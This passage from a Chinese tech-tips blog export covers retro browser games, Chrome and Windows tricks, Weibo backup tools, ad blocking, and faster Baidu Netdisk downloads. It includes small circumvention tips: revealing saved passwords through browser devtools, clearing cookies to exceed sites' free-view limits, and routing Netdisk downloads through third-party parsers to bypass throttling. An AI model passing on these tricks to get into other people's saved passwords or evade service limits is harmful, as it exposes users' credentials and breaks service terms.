    <content type="text"><![CDATA[苏生不惑第156 篇原创文章，将本公众号设为星标，第一时间看最新文章。 前段时间看到一条微博 说出一款可以证明年龄的游戏https://www.weibo.com/3486415705/J5YKsEXMk ，目前有近2000条评论，很多耳熟能详的经典游戏，比如主题医院，红警，小霸王，金山打字，俄罗斯方块，冒险岛，超级玛丽，魂斗罗，俄罗斯方块，贪吃蛇等。红白机经典游戏，你都玩过吗？ https://www.weibo.com/5979310491/J4X9KtGKv 于是我收集整理了下面这些经典好玩的在线游戏。 魂斗罗《魂斗罗》是日本科乐美公司于1987年发行的街机卷轴射击游戏系列，后来移植到其他多个平台 https://jsnes.cn/画面是不很熟悉。 这个网站还有1981五子棋，中国象棋等游戏。 超级马里奥《超级马里奥兄弟》是任天堂公司开发并于1985年出品的著名横版过关游戏 ，在线玩超级马里奥 https://game.ioxapp.com/mario/这个网站还有很多类似游戏https://game.ioxapp.com/ 俄罗斯方块《俄罗斯方块》是一款由俄罗斯人阿列克谢·帕基特诺夫于1984年6月发明的休闲游戏，在线玩俄罗斯方块 https://chvin.github.io/react-tetris/?lan=zh-cn https://tetris.com/play-tetris https://www.elsfk.cn/ 坦克大战《坦克大战》是由日本南梦宫Namco游戏公司开发的一款平面射击游戏，于1985年发售，游戏以坦克战斗及保卫基地为主题，属于策略型联机类。在线玩坦克大战，你能玩到几关 https://battle-city.js.org/#/stage/1 https://github.com/shinima/battle-city 坦克大战复刻版 http://shinima.pw/battle-city/ https://www.tanke.org.cn/来玩几把。 小霸王小霸王，其乐无穷，带你找回失落的童年记忆 https://www.yikm.net/ PC 端 w s a d 分别是上下左右，j k 分别是攻击和跳，b 是选择，回车是开始。你要不来试试？ 红警在线前段时间红警1游戏开源了 https://github.com/electronicarts/CnC_Remastered_Collection ，https://cncnet.org/red-alert 支持Windows ，Mac版 。 在线扫雷扫雷经典游戏，应该很多人在Windows下玩过，现在可以在线玩了https://www.saolei.org.cn/ ，有兴趣还可以玩玩五子棋，坦克。 在线 dos 游戏经典在线 dos 游戏 https://dos.zczc.cz/ ，如金庸群侠传，仙剑奇侠传，三国志等https://github.com/rwv/chinese-dos-games 在线玩魔方在线玩魔方，可切换3种模式：普通，公式播放，动画制作 https://huazhechen.gitee.io/cuber/ 圈小猫益智游戏《圈小猫》，点击小圆点，围住小猫 https://www.ctakj.com/games/cat.html 色差辨识度来测测你眼睛对色差的辨识度， 找出所有色块里颜色不同的一个http://www.cuishuai.cc/game/https://weibo.com/5940888202/Iwl3xgiuG 看你能玩到几关 Chrome 小恐龙游戏当 Chrome 浏览器没有连上网络，就会出现这个小恐龙，按空格就可以开始游戏了。 当然不用断网输入chrome://dino/也可以玩，有人还将它移植出来一个网站 https://ishare20.net/game/chromedino/如果想作弊玩让它一直跑可以打开控制台执行以下代码123var dino=Runner.prototypedino.gameOver=()=&gt;&#123;&#125;Runner.instance_.setSpeed(233) Chrome浏览器在断网时会出现恐龙小游戏当然不断网输入chrome://dino/也可以玩，如果在手机上可以用这个 https://ishare20.net/game/chromedino/ ，想玩高分，F12打开控制台执行以下代码123var dino=Runner.prototypedino.gameOver=()=&gt;&#123;&#125;Runner.instance_.setSpeed(233) Edge 浏览器内置的冲浪游戏已经上线，各位可以在浏览器地址里输入 Edge://surf 即可进行冲浪！ 反应速度大比拼先按“开始”键启动，然后等背景色转变，只要它一变，立即点“结束”键http://games.sina.com.cn/z/cs/test.shtml?from=wap 打字https://zty.pe/ 小游戏合集国外的一个挺有趣的网页小游戏合集网站 https://iogames.space/ 谷歌搜索谷歌搜索里自带了不少经典游戏，这个之前文章介绍过了 那些有意思的谷歌/百度搜索彩蛋 比如搜索 play snake 玩贪吃蛇。| 公众号后台回复关键词 | 用途 || — | — || 微信 | 获取你的微信好友头像拼图及查看微信撤回消息 || b站 | 获取下载b站视频工具及找回被删b站视频方法 || 视频 | 获取下载腾讯，优酷，爱奇艺，微博视频工具及去除logo脚本 || 百度网盘 | 获取加速下载网盘文件方法及查找电影电视剧网站 || 朋友圈 | 获取发空白朋友圈方法 || 微博 | 获取备份微博工具及分析微博账号数据 || 音乐 | 获取下载音乐工具及在线听歌网站 || 油猴 | 获取油猴脚本 ||谷歌|获取安装Chrome扩展方法| 公众号 苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[那些你可能不知道的谷歌浏览器实用技巧]]></title>
    <url>%2F2020%2F07%2F24%2F%E9%82%A3%E4%BA%9B%E4%BD%A0%E5%8F%AF%E8%83%BD%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E8%B0%B7%E6%AD%8C%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%9E%E7%94%A8%E6%8A%80%E5%B7%A7%2F</url>
    <content type="text"><![CDATA[苏生不惑第155 篇原创文章，将本公众号设为星标，第一时间看最新文章。 关于谷歌浏览器之前写过以下文章： 实用油猴脚本推荐，让你的谷歌浏览器更强大 Chrome 浏览器扩展神器油猴 请停用以开发者模式运行的扩展程序？搞定谷歌浏览器插件弹窗 上不了谷歌如何安装 Chrome 扩展？ 那些有意思的谷歌/百度搜索彩蛋 那些你可能不知道的浏览器奇技淫巧 为什么我一直推荐使用谷歌浏览器呢，某些国产浏览器会自作主张封杀某些域名，还经常弹各种广告，当然更主要的是方便我使用谷歌搜索。 而且谷歌浏览器可以直接在 https://www.google.cn/chrome/ 下载，还有很多谷歌产品在国内都可以直接打开，可以看看我之前的文章那些在国内还能使用的谷歌产品 ，下面分享些谷歌浏览器的实用技巧，可能你之前没发现。 Omnibox 快捷服务谷歌将 Chrome 地址栏称作 Omnibox, 就是把传统地址栏和搜索引擎结合起来，可以直接在地址栏运行计算器、单位转换、查天气等。 比如计算 666*888 =591408查天气 导出密码谷歌浏览器有记住密码功能，登录后会保存你的账号密码到浏览器，下次不用再手动输入，如果你忘记密码的话可以通过控制台删除代码里的password看到你的密码。 你还可以将保存的所有网站密码导出来，打开 chrome://settings/passwords 选择导出密码。然后生成一个CSV文件 Chrome 密码.csv ，里面都是你的账号和明文密码（注意安全）。 如果你想导入密码（同样也是CSV格式的文件），需要打开chrome://flags/#PasswordImport 进入实验室功能，将 Password import 选项的 default 改为 enable 状态，然后重启浏览器在 chrome://settings/passwords 导入。 清理cookie某些网站不登录时会根据cookie来限制你可以访问多少视频或者文章，如果达到上限让你登录怎么办？按F12打开控制台 选择application，左侧cookie直接clear ，再次访问网站会重新生成cookie 。 也可以在console执行 document.cookie = &#39;count=; expires=Thu, 01 Jan 1970 00:00:01 GMT;&#39;; 如果觉得麻烦可以安装Chrome插件cookieAutoClear https://chrome.google.com/webstore/detail/cookie-autoclear/bdlecjncfafhlnehekghapanflfcbikk/related 还有插件可以编辑cookie https://chrome.google.com/webstore/detail/editthiscookie/fngmhnnpilhplaeedifhccceomclgfbg ，安装Chrome插件参考之前文章上不了谷歌如何安装 Chrome 扩展？ 模拟手机模式访问有些网站限制了手机模式才能访问，你不必真的去手机上访问，可以通过控制台的toggle device toolbar 选择对应手机模式访问，比如微博移动主页 https://m.weibo.cn/u/1744395855 Chrome 快捷键和Windows一样 那些你可能不知道的 windows 奇技淫巧，Chrome浏览器有很多快捷键，比如 Ctrl+t打开新窗口，Ctrl+w关闭窗口，Ctrl+tab切换标签 ，Ctrl+shift+n 新建隐身窗口，Ctrl + d将当前网页保存为书签，Ctrl + Shift + t 重新打开先前关闭的标签页，更多快捷键见谷歌官网 https://support.google.com/chrome/answer/157179?hl=zh-Hans ，Windows和Mac 还有点不同。 如果想完全用快捷键来操作浏览器可以安装Chrome扩展 Vimium https://chrome.google.com/webstore/detail/vimium/dbepggeogbaibhgnhhndojpepiihcmeb，它可以让你用键盘来完成各种操作，比如按下 t 打开新标签页，按下 d 往下翻页等，再结合默认的快捷键，可以最大程度的摆脱鼠标，完全用键盘操作。 地址栏tab搜索如果你使用过网站自带搜索功能，比如百度微博知乎，可以直接在地址栏中输入该网站的地址，然后按下Tab按钮，即可调用该网站内嵌的搜索引擎。 网址显示https 和 www现在的Chrome浏览器已经不显示https 和 www，不知道产品经理怎么想的，每次都要复制粘贴一遍才能看到完整的地址， 你可以双击地址栏看到https 和www。 也可以安装个Chrome插件 https://chrome.google.com/webstore/detail/suspicious-site-reporter/jknemblkbdhdcpllfgbfekkdciegfboi 打包备份Chrome扩展经常有人问上不了谷歌怎么安装Chrome扩展，如果你的浏览器安装好了可以打包好发给对方，先打开 chrome://extensions/ 点击打包扩展程序 。 这里以油猴扩展为例 https://chrome.google.com/webstore/detail/tampermonkey/dhdgffkkebhmkfjojejmpbldmpobfkfo ，它的id 为 dhdgffkkebhmkfjojejmpbldmpobfkfo ，默认安装目录为C:\Users\xxx\AppData\Local\Google\Chrome\User Data\Default\Extensions ，xxx为你的Windows用户名 。浏览里选择油猴源代码目录 C:\Users\xxx\AppData\Local\Google\Chrome\User Data\Default\Extensions\dhdgffkkebhmkfjojejmpbldmpobfkfo\4.10_0 打包成功，在目录下生成了文件 4.10_0.crx，然后发给对方安装油猴扩展。 隐身模式一般网站会跟踪你的浏览习惯，比如淘宝搜索过某些商品后会给你推荐相关商品，使用隐身模式（快捷键ctrl+shift+n）即可防止被跟踪记录。 不过你安装的Chrome扩展在隐身模式下不起作用了，如果还想使用，可以在扩展设置里启用无痕模式，比如idm扩展 https://chrome.google.com/webstore/detail/idm-integration-module/ngpampappnmepgilojfohadhhmbhlaek再次打开隐身模式可以看到idm扩展能使用了。 继续浏览上次未关闭网页如果你打开了很多页面，不想都保存到收藏夹以便下次继续看，可以设置启动浏览器时继续浏览上次打开的网页。 搞定禁止复制文字有些网页禁止了复制文字，连选择文字都禁止了，怎么办？，可以看看之前文章如何搞定某些网站不让复制文字 ，也可以Ctrl+p 打开打印页面复制文字。 修改页面元素网页上的文字和图片截图是不可信的，因为可以任意修改 HTML代码。 当然这样修改刷新会变回原样，不过可以借助油猴脚本来实现刷新后页面也是修改过的，这个之前的文章一个骚操作，公众号粉丝破10万！ 已经详细介绍过了。 长截图打开控制台 Ctrl+Shift+P 后，输入capture 点击capture full size screenshot 接口将整个网页截图。 如果想更方便的长截图可以参考之前文章 如何优雅的对网页截取长图 断网模式断网模式下可以玩恐龙小游戏，不过不用真的断网，打开控制台的network，开启offline模式，马上就可以体验了。 ps：其实直接输入chrome://dino/ 就可以玩。 内部页面谷歌自带一些内部页面，一般用来配置管理插件，可以通过 chrome://chrome-urls/ 这个页面来查看所有自带的内部地址。 比如 chrome://settings/searchEngines 管理搜索引擎 。地址栏输入文字直接回车会使用谷歌来搜索。选择文字和右键图片也可以直接使用谷歌来搜索。 浏览文件地址栏除了可以输入常见的网址，还支持file格式，比如 file:///D:/code/weibo_down/weibo/ 打开d盘下的微博目录 ，这个目录是之前用Python备份微博生成的 一键备份微博并导出生成PDF，顺便用Python分析微博账号数据和访问硬盘一样 。PDF也可以直接浏览，都不用安装PDF软件，只需将PDF文件拖到Chrome就可以直接打开阅读。 标签页分组83.0.4103.61版后上线了标签页分组功能，如果你经常开很多标签不好找的话可以试试这个功能，可以将相同类型的标签放在同一标签组内，通过颜色名称来区分标签栏。起个分组名字叫谷歌。 任务栏菜单在任务栏处右击Chrome图标，会出一个下拉菜单，可以看到常去网站，最近关闭的网页，任务。| 公众号后台回复关键词 | 用途 || — | — || 微信 | 获取你的微信好友头像拼图及查看微信撤回消息 || b站 | 获取下载b站视频工具及找回被删b站视频方法 || 视频 | 获取下载腾讯，优酷，爱奇艺，微博视频工具及去除logo脚本 || 百度网盘 | 获取加速下载网盘文件方法及查找电影电视剧网站 || 朋友圈 | 获取发空白朋友圈方法 || 微博 | 获取备份微博工具及分析微博账号数据 || 音乐 | 获取下载音乐工具及在线听歌网站 || 油猴 | 获取油猴脚本 ||谷歌|获取安装Chrome扩展方法| 公众号 苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[那些你可能不知道的 windows 奇技淫巧]]></title>
    <url>%2F2020%2F07%2F24%2F%E9%82%A3%E4%BA%9B%E4%BD%A0%E5%8F%AF%E8%83%BD%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84-windows-%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7%2F</url>
    <content type="text"><![CDATA[苏生不惑第154 篇原创文章，将本公众号设为星标，第一时间看最新文章。 奇技淫巧系列更新第11篇，之前的10篇如下： 那些你可能不知道的浏览器奇技淫巧 那些你可能不知道的知乎奇技淫巧 那些你可能不知道的微信奇技淫巧 那些你可能不知道的微博奇技淫巧 那些你可能不知道的网易云音乐奇技淫巧 那些你可能不知道的搜索奇技淫巧 那些你可能不知道的视频下载奇技淫巧 那些你可能不知道的免费观看 VIP 视频奇技淫巧 那些你可能不知道的 bilibili 奇技淫巧 那些你可能不知道的网络冷知识奇技淫巧 锁屏在办公室临时出去怕同事动你的电脑，直接Win+l锁屏，需要输入密码才能打开。 切回桌面上班正摸鱼，忽然发现boss过来了，直接Win+d切回桌面，boss走后再Win+d切回去，推荐一个Windows假装升级的网站 https://fakeupdate.net/ ，按全屏效果： cmd命令行快捷键win+r，输入框内输入cmd即可。 也可以在文件地址栏直接输入cmd，还能直接定位当前文件夹。还可以输入网址直接调用默认浏览器打开。 程序无响应当桌面程序卡死无响应时，打开任务管理器找到explorer.exe，右键结束进程，这时桌面会消失，按win+r 输入explorer.exe 桌面又回来了。 查看 windows 启动程序按win+r 输入msconfig 可以查看windows相关启动程序和服务等。可以关闭一些不必要开机启动的程序。 insert键有时候用键盘输入会直接覆盖前面的文字，那是你不小心碰到了 insert 键，它会在插入和覆盖两种状态中切换，再按一次insert即可解决。 快速定位文件文件夹里的文件太多不好找？直接输你要找的文件名首字母，瞬间定位到，不过只支持英文文件名。 搜中文可以配合Everything，这个之前介绍过 如何快速搜索文件和文件内容 定时关机按win+r 输入 shutdown -s -t 10 ，电脑会在10秒后关机也可以指定 20点1分关机 at 20:00 Shutdown -s -t 60 ，想取消关机输入shutdown -a 批量重命名文件同时选择多个文件，按F2键，然后重命名这些文件中的一个，所有被选择的文件将会被重命名为新的文件名(在文件名末尾加上递增的数字)。 输入生僻字遇到不认识的生僻字怎么办？如果你用搜狗输入法通过u模式输入ushuishuishui就能打出 淼，还给你标出拼音。 输入 v123456 可以打出大写的数字 壹拾贰万叁仟肆佰伍拾陆，更多技巧查看搜狗官方文档 https://pinyin.sogou.com/help.php?list=3&amp;q=8 字符映射表©®这些符号怎么输入？按Win+r输入 charmap 找到自己需要的符号选择复制就可以了。 事件查看器电脑出故障了，不知道为什么，查下系统日志吧， 输入可靠，每天发生了哪些事件一目了然。 分享个解决电脑故障的网站 http://www.zou114.com/dncidian/ 截图除了使用QQ这样的截图工具 ，直接用快捷键 alt+printscreen 也可以窗口截图 ，printscreen 截全屏，如果要长截图推荐之前介绍的工具如何优雅的对网页截取长图 修改hosts文件hosts 是一个系统文件，它将域名与 IP 相关联，访问一个域名的时候，系统会先在hosts 文件寻找对应的 IP 地址，如果找到了就打开对应的ip，所以如果我们手动修改ip为127.0.0.1，这样域名就没法打开了，比如618的时候搜狗输入法弹广告，可以在hosts加上下面这段，弹窗广告就出不来了。 123456127.0.0.1 safe.ie.sogou.com127.0.0.1 vinci.ie.sogou.com127.0.0.1 cronus.ie.sogou.com127.0.0.1 get.ie.sogou.com127.0.0.1 safe.ie.sogou.com127.0.0.1 get.sogou.com ps：如果加入127.0.0.1 taobao.com ，淘宝就打不开了。 如何修改hosts文件呢，快捷键Win+R 输入 drivers 直接打开 C:\Windows\System32\drivers 目录，里面就有hosts文件。 查看本机ip打开命令行输入 ipconfig ，IPv4 地址就是。 设置命令行环境变量如果你经常使用命令行肯定设置过环境变量，比如我之前介绍的下载视频工具annie 如何轻松下载腾讯/微博/优酷/爱奇艺/b站等全网视频？在开始菜单中输入path 选择编辑环境变量然后复制annie文件的路径编辑保存。然后在命令行下载b站视频。1234567891011λ annie -f 16 https://www.bilibili.com/video/av69858806/ Site: 哔哩哔哩 bilibili.com Title: 仅仅三分钟，周星驰演出了80集爱情剧的效果 Type: video Stream: [16] ------------------- Quality: 流畅 360P Size: 5.06 MiB (5302699 Bytes) # download with: annie -f 16 ... 5.06 MiB / 5.06 MiB [========================================================] 100.00% 722.39 MiB/s 0s 更多快捷键更多快捷键见微软官网 https://support.microsoft.com/zh-cn/help/12445/windows-keyboard-shortcuts win+e 打开我的电脑win+r 运行程序alt+tab 切换窗口，Windows10下 win+g 直接录屏win + 1234等数字键 按任务栏上的顺序切换窗口 快捷键图https://support.microsoft.com/zh-cn/help/12445/windows-keyboard-shortcuts 以上只是一些常用的使用技巧，更多技巧可以看微软官网整理的https://www.microsoft.com/zh-cn/tips/home ，还有什么你常用的技巧也可以在文章末尾留言分享。 公众号后台回复关键词 用途 微信 获取你的微信好友头像拼图及查看微信撤回消息 b站 获取下载b站视频工具及找回被删b站视频方法 视频 获取下载腾讯，优酷，爱奇艺，微博视频工具及去除logo脚本 百度网盘 获取加速下载网盘文件方法及查找电影电视剧网站 朋友圈 获取发空白朋友圈方法 微博 获取备份微博工具及分析微博账号数据 音乐 获取下载音乐工具及在线听歌网站 油猴 获取油猴脚本 谷歌 获取安装Chrome扩展方法 公众号 苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[再谈备份微博和微博仅自己可见]]></title>
    <url>%2F2020%2F07%2F17%2F%E5%86%8D%E8%B0%88%E5%A4%87%E4%BB%BD%E5%BE%AE%E5%8D%9A%E5%92%8C%E5%BE%AE%E5%8D%9A%E4%BB%85%E8%87%AA%E5%B7%B1%E5%8F%AF%E8%A7%81%2F</url>
    <content type="text"><![CDATA[苏生不惑第153 篇原创文章，将本公众号设为星标，第一时间看最新文章。 关于微博之前写过以下文章： 那些你可能不知道的微博奇技淫巧 想方便快捷的分享/收藏图片？试试免费好用的微博/b站图床 如何轻松下载腾讯/微博/优酷/爱奇艺/b站等全网视频？ 如何更优雅地使用微博 一键备份微博并导出生成PDF，顺便用Python分析微博账号数据 除了使用稳部落和Python来备份微博，这里再分享个好用的Chrome扩展 Octoman 。 OctomanOctoman是个Chrome扩展 https://chrome.google.com/webstore/detail/octoman%E5%BE%AE%E5%8D%9A%E5%A4%87%E4%BB%BD/pojodomdlpobompicdllljgiomnfpmho ，推荐你使用谷歌浏览器 https://www.google.cn/intl/zh-CN/chrome/ ， 安装Chrome扩展方法见之前文章上不了谷歌如何安装 Chrome 扩展？ 安装扩展后登录微博h5 https://m.weibo.cn/ ，这个扩展也是基于h5微博接口来备份微博的。 这里还是备份李健的微博（即使是炸了的号也可以），打开他的微博主页 https://weibo.com/musiclijian 点击Chrome扩展图标，在下拉列表中选择需要保存的用户，然后点击保存即可。 这个扩展将每500条微博（会展开长微博）存为一个HTML文件， 也可以在选项设置调整。稍等一会会在浏览器下载里生成2个HTML文件 ：1.76MB的文件 歌手李健_01.html348kb的文件歌手李健_02_finish.html，600多条微博都备份下来了，可以直接用浏览器打开浏览，可以看到李健第一条微博是2010年，已经10年了。 之前文章 一键备份微博并导出生成PDF，顺便用Python分析微博账号数据 分析过李健的微博词云图，他的微博关键词为音乐，北京，朋友，歌手，电影，居然还提到了周杰伦。 每个月转发评论点赞总数图，可以看到2016-2018年的微博数据是高峰期。原创微博和转发微博数据比例。 李健发微博的工具主要为pc网页和iPad。 生成的微博备份文件在 chrome://downloads/ ，默认为当前Windows用户download目录。 备份的文件引用CSS文件还是微博的，为了防止将来打不开，最好还是用Chrome扩展 SingleFile https://chrome.google.com/extensions/detail/mpiodijhokgodhhofbcjdecpffjipkle 再次备份，这个之前文章再谈备份网页和公众号文章介绍过了。 不过这个扩展有个不方便的地方没有时间段选择，每次都得重新备份，或者你只想备份某段时间的微博也不行，如果想根据时间段来备份推荐用之前介绍的 一键备份微博并导出生成PDF，顺便用Python分析微博账号数据 除了备份微博，作者还有个Chrome扩展可以备份微博相册 https://chrome.google.com/webstore/detail/octo%E5%BE%AE%E5%8D%9A%E7%9B%B8%E5%86%8C%E6%89%B9%E9%87%8F%E4%B8%8B%E8%BD%BD/cdimdlckbkfelaogjhfbkjcfncbpngkn 微博相册下载进入微博主页，这里选择王菲的微博 https://www.weibo.com/u/1629810574 ，天后已经5年不更新微博了， 点击扩展图标，点击需要下载的相册 。 选择头像相册，有6张图片，很快下载好了，备份其他相册类似。 麋鹿微博工具箱 如果你不想微博哪天被人挖坟，可以将微博批量删除、设置仅自己可见、仅好友可见，这里推荐一个工具麋鹿微博工具箱http://www.xiaomilu.top/ 。 先下载软件（公众号内回复 微博 获取软件）到本地直接运行，浏览器会访问 http://127.0.0.1:8083/需要先登录微博 。用微博扫码登录就行。开始扫描你的微博，微博多的话可能慢点。 选择时间段，可以对微博删除，恢复公开，仅自己可见，仅粉丝可见，仅好友圈可见。 微博书最后如果你想把微博制作成书，已经有很多成熟的产品，类似 出书啦https://chushu.la/wechatbook/guide ，微信书 https://weixinshu.com/ ，拾柒 https://www.shiqichuban.com/simple/app/#/user/login ，当然这些都是付费的。 公众号后台回复关键词 用途 微信 获取你的微信好友头像拼图及查看微信撤回消息 b站 获取下载b站视频工具及找回被删b站视频方法 视频 获取下载腾讯，优酷，爱奇艺，微博视频工具及去除logo脚本 百度网盘 获取加速下载网盘文件方法及查找电影电视剧网站 朋友圈 获取发空白朋友圈方法 微博 获取备份微博工具及分析微博账号数据 音乐 获取下载音乐工具及在线听歌网站 油猴 获取油猴脚本 谷歌 获取安装Chrome扩展方法 公众号 苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[如何去除烦人的垃圾广告]]></title>
    <url>%2F2020%2F07%2F17%2F%E5%A6%82%E4%BD%95%E5%8E%BB%E9%99%A4%E7%83%A6%E4%BA%BA%E7%9A%84%E5%9E%83%E5%9C%BE%E5%B9%BF%E5%91%8A%2F</url>
    <content type="text"><![CDATA[苏生不惑第152 篇原创文章，将本公众号设为星标，第一时间看最新文章。 平常使用百度搜索，广告一般占据前几个位置，毕竟人家给了钱的，不过广告太多就很影响搜索体验了，比如搜索Python，前5个都是广告。 相比之下谷歌搜索就好多了，第一个就是Python官网，所以我一直推荐大家使用谷歌搜索和谷歌浏览器 ，谷歌还有很多产品 那些在国内还能使用的谷歌产品 还有类似天涯这样的网站http://bbs.tianya.cn/post-develop-2448554-1.shtml ，左右和上方都是广告，很影响看帖子。 下面分享几个去广告方案。 百度搜索去广告油猴脚本关于油猴脚本之前介绍过很多次了，详情见文章实用油猴脚本推荐，让你的谷歌浏览器更强大 推荐百度搜索去广告油猴脚本 https://greasyfork.org/zh-CN/scripts/406336 快速去除百度结果页的顽固广告和右边栏，适当放大了界面，采用居中布局，美化了字体等样式，页面显示更加美观，支持随时开启/关闭黑色主题。 再次搜索没有垃圾广告了，第一个就是官网。 这个只是针对百度的去广告方案，如果是其他网站推荐广告终结者。 广告终结者 广告终结者是一款浏览器插件，可以清除网页上的浮动广告，购物广告，恶意弹窗，跟踪代码，让你浏览网页更快更清爽， 它支持绝大多数浏览器。 我用的谷歌浏览器，Chrome扩展地址https://chrome.google.com/webstore/detail/%E5%B9%BF%E5%91%8A%E7%BB%88%E7%BB%93%E8%80%85/fpdnjdlbdmifoocedhkighhlbchbiikl?hl=zh-CN ，安装Chrome扩展方法见之前文章上不了谷歌如何安装 Chrome 扩展？ ，再次打开天涯帖子，发现页面广告不见了。 除了去除网页广告，它还有个实用功能就是去除视频广告，比如腾讯，优酷，爱奇艺这样的影视网站，开头广告 45秒这还算短的，我见过120秒的广告 。想去广告就买会员吧，我也不经常上这几个网站，会员就没必要买了。 安装好这个扩展后再次打开爱奇艺可以看到广告一晃而过就开始播放视频，而且视频中的广告也能去了，我录制了个GIF。现在可以愉快的刷《武林外传》了。类似的扩展还有 uBlock Origin https://chrome.google.com/webstore/detail/ublock-origin/cjpalhdlnbpafiamejdnhcphjbkeiagm 这个可以根据自己的需要设置广告拦截规则。 修改 hostshosts 是一个系统文件，它将域名与 IP 相关联，访问一个域名的时候，系统会先在hosts 文件寻找对应的 IP 地址，如果找到了就打开对应的ip，所以如果我们手动修改ip为127.0.0.1，这样域名就没法打开了，比如618的时候搜狗输入法弹广告，可以在hosts加上下面这段，弹窗广告就出不来了。 123456127.0.0.1 safe.ie.sogou.com127.0.0.1 vinci.ie.sogou.com127.0.0.1 cronus.ie.sogou.com127.0.0.1 get.ie.sogou.com127.0.0.1 safe.ie.sogou.com127.0.0.1 get.sogou.com ps：如果加入127.0.0.1 taobao.com ，淘宝就打不开了。 如何修改hosts文件呢，快捷键Win+R 输入 drivers 直接打开 C:\Windows\System32\drivers 目录，里面就有hosts文件。 有人整理了很多网站的广告域名，添加这些到hosts文件就能去广告了 https://raw.githubusercontent.com/jdlingyu/ad-wars/master/hosts APP 去广告安卓推荐 A盾牌 https://sj.qq.com/myapp/detail.htm?apkName=com.adko.kingdom 和 Adguard for Android https://adguard.com/zh_cn/welcome.html ，iOS 推荐 QuantumultX https://github.com/Hedilict/QuantumultX 最后推荐一个谷歌搜索过滤扩展uBlacklist https://chrome.google.com/webstore/detail/ublacklist/pncfbmialoiaghdehhbnbhkkgmjanfhe/related，方便你搜索的时候不看某些垃圾网站的搜索结果。 公众号后台回复关键词 用途 微信 获取你的微信好友头像拼图及查看微信撤回消息 b站 获取下载b站视频工具及找回被删b站视频方法 视频 获取下载腾讯，优酷，爱奇艺，微博视频工具及去除logo脚本 百度网盘 获取加速下载网盘文件方法及查找电影电视剧网站 朋友圈 获取发空白朋友圈方法 微博 获取备份微博工具及分析微博账号数据 音乐 获取下载音乐工具及在线听歌网站 油猴 获取油猴脚本 谷歌 获取安装Chrome扩展方法 公众号 苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2020年7月最新加速下载百度网盘文件方法]]></title>
    <url>%2F2020%2F07%2F17%2F2020%E5%B9%B47%E6%9C%88%E6%9C%80%E6%96%B0%E5%8A%A0%E9%80%9F%E4%B8%8B%E8%BD%BD%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98%E6%96%87%E4%BB%B6%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[苏生不惑第151 篇原创文章，将本公众号设为星标，第一时间看最新文章。 关于百度网盘之前已经写过了： 2020 年 3 月最新加速下载百度网盘文件方法 2020 年 4 月使用 Aria2 加速下载百度网盘文件 2020 最全百度网盘搜索，找电影资源不再愁 没有提取码怎么获取百度网盘资源？ 今天分享的是一个免登陆加速下载百度网盘方案。 naifei先生成一个网盘分享地址，以电视剧《武林外传》80集为例，自定义一个提取码6688（需安装网盘助手油猴脚本，参考之前文章实用油猴脚本推荐，让你的谷歌浏览器更强大） 生成了一个链接: https://pan.baidu.com/s/1kfEcPLSAE-VLFHrM76RXxg 提取码: 6688，之后将链接替换这里的参数 http://pan.naifei.cc/?share=id&amp;pwd=pwd id代表网盘分享链接里的1kfEcPLSAE-VLFHrM76RXxg，pwd代表密码，就是6688，直接打开地址 http://pan.naifei.cc/?share=1kfEcPLSAE-VLFHrM76RXxg&amp;pwd=6688 可以看到文件名和大小及下载地址，直接点我下载，弹出idm下载框（公众号内回复 百度网盘 获取idm软件）。 可以看到速度能到2MB/s同样录制了个GIF，GIF工具见之前的文章那些好用的 GIF 录制工具 如果是他人分享的网盘链接，没有提取码，安装网盘助手油猴脚本就可以获取到了。 如果嫌拼接链接麻烦可以使用工具（公众号内回复 百度网盘 获取软件），只要复制网盘链接，自动解析，然后点下载。 也可以使用油猴脚本 https://greasyfork.org/zh-CN/scripts/406851-naifei ，在打开别人分享的百度网盘链接时，显示一个直达pan.naifei.cc的下载按钮，支持提取码链接，可配合自动填写提取码脚本使用。 这个方法可谓很简单了，而且不用登录网盘账号，防止被限速，不过不知道能挺多久，大家且用且珍惜，如果挂了再分享一个油猴脚本也可以加速下载网盘。 百度网盘下载管理器油猴脚本地址 https://greasyfork.org/zh-CN/scripts/405782 ，安装油猴脚本前先安装好油猴Chrome扩展（公众号内回复 油猴 获取）。https://github.com/dotennin/baidu-pan-downloader 安装完脚本后打开网盘首页，右下角可以看到图标 选择文件后点击开始下载，速度也有1-2MB/s 这个跟使用idm下载差不多（这个很稳定了，使用了很久，如果下载不了更改应用id，具体参考文章2020 年 3 月最新加速下载百度网盘文件方法），就是方便点。 最后下载的文件打开 chrome://downloads/ 可以看到。 公众号后台回复关键词 用途 微信 获取你的微信好友头像拼图及查看微信撤回消息 b站 获取下载b站视频工具及找回被删b站视频方法 视频 获取下载腾讯，优酷，爱奇艺，微博视频工具及去除logo脚本 百度网盘 获取加速下载网盘文件方法及查找电影电视剧网站 朋友圈 获取发空白朋友圈方法 微博 获取备份微博工具及分析微博账号数据 音乐 获取下载音乐工具及在线听歌网站 油猴 获取油猴脚本 谷歌 获取安装Chrome扩展方法 公众号 苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[那些你可能用得上的在线办公神器系列（三）]]></title>
    <url>%2F2020%2F07%2F10%2F%E9%82%A3%E4%BA%9B%E4%BD%A0%E5%8F%AF%E8%83%BD%E7%94%A8%E5%BE%97%E4%B8%8A%E7%9A%84%E5%9C%A8%E7%BA%BF%E5%8A%9E%E5%85%AC%E7%A5%9E%E5%99%A8%E7%B3%BB%E5%88%97%EF%BC%88%E4%B8%89%EF%BC%89%2F</url>
